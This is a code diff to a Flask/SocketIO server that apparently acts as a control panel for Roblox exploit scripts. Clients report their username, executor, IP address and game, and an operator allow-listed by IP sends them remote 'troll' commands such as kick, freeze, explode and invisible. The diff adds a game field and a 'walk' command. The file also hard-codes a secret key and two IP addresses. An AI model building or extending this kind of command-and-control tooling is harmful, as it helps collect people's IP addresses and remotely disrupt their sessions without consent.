@@ -9,14 +9,12 @@ app = Flask(__name__)
 app.config["SECRET_KEY"] = "super_secret_key_change_me_123456"
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")
 
-# === LES 2 IP AUTORISÉES ===
 ALLOWED_IPS = {"37.66.149.36", "91.170.86.224"}
 
 connected_players = {}
 pending_kicks = {}
 pending_commands = {}
 
-# Vérification IP
 def check_ip():
     ip = request.headers.get("X-Forwarded-For", request.remote_addr)
     if ip and "," in ip:
@@ -39,13 +37,11 @@ def access_denied(e):
     </html>
     """, 403
 
-# Protection des routes sensibles
 @app.before_request
 def protect_routes():
     if request.path in ["/", "/kick", "/troll"]:
         check_ip()
 
-# === HTML DU PANEL (exactement le même qu’avant) ===
 HTML = """<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -146,7 +142,7 @@ function render(data) {
         card.innerHTML = `
             <div class="status"><div class="dot ${p.online ? "online" : ""}"></div><span>${p.online ? "Online" : "Offline"}</span></div>
             <div class="name"><a href="https://www.roblox.com/users/${id}/profile" target="_blank">${p.username}</a> (ID ${id})</div>
-            <div class="info">Executor: ${p.executor}<br>IP: ${p.ip}</div>
+            <div class="info">Executor: ${p.executor}<br>IP: ${p.ip}<br>Game: ${p.game or "Unknown"}</div>
             <div class="category">TROLLS</div>
             <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
                 <button class="kick-btn" style="background:linear-gradient(45deg,#ff3366,#ff5588);" onclick="openKickModal('${id}')">KICK</button>
@@ -156,13 +152,14 @@ function render(data) {
                 <button class="kick-btn" style="background:linear-gradient(45deg,#88ff88,#55aa55);" onclick="sendTroll('${id}','rainbow')">RAINBOW</button>
                 <button class="kick-btn" style="background:linear-gradient(45deg,#ff5555,#aa0000);" onclick="sendTroll('${id}','explode')">EXPLODE</button>
                 <button class="kick-btn" style="background:linear-gradient(45deg,#5555ff,#0000aa);" onclick="sendTroll('${id}','invisible')">INVISIBLE</button>
-                <button class="kick-btn" style="background:linear-gradient(45deg,#aa0000,#ff0000);" onclick="sendTroll('${id}','delete_coregui')">DELETE GUI</button>
+                <button class="kick-btn" style="background:linear-gradient(45deg,#ffaa00,#aa5500);" onclick="sendTroll('${id}','walk')">WALK</button>
             </div>
             <div class="category">UNDO</div>
             <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
                 <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','unfreeze')">UNFREEZE</button>
                 <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','unspin')">UNSPIN</button>
                 <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','unrainbow')">STOP RAINBOW</button>
+                <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','uninvisible')">UNINVISIBLE</button>
             </div>
         `;
     });
@@ -187,7 +184,6 @@ socket.on("status", d => toast(`${d.username} is now ${d.online ? "online" : "of
 def index():
     return render_template_string(HTML)
 
-# === API ROBLOX (inchangée) ===
 @app.route("/api", methods=["GET", "POST"])
 def api():
     now = time.time()
@@ -201,7 +197,8 @@ def api():
                     "executor": d.get("executor", "Unknown"),
                     "ip": d.get("ip", "Unknown"),
                     "last": now,
-                    "online": True
+                    "online": True,
+                    "game": d.get("game", "Unknown")
                 }
                 socketio.emit("status", {"username": connected_players[uid]["username"], "online": True})
             elif d.get("action") == "heartbeat" and uid in connected_players:
@@ -243,7 +240,6 @@ def troll():
         socketio.emit("kick_notice", {"username": name, "reason": cmd.upper()})
     return jsonify({"sent": True})
 
-# Background update
 def broadcast_loop():
     while True:
         now = time.time()
@@ -264,4 +260,3 @@ def broadcast_loop():
 if __name__ == "__main__":
     socketio.start_background_task(broadcast_loop)
     socketio.run(app, host="0.0.0.0", port=5000)
-
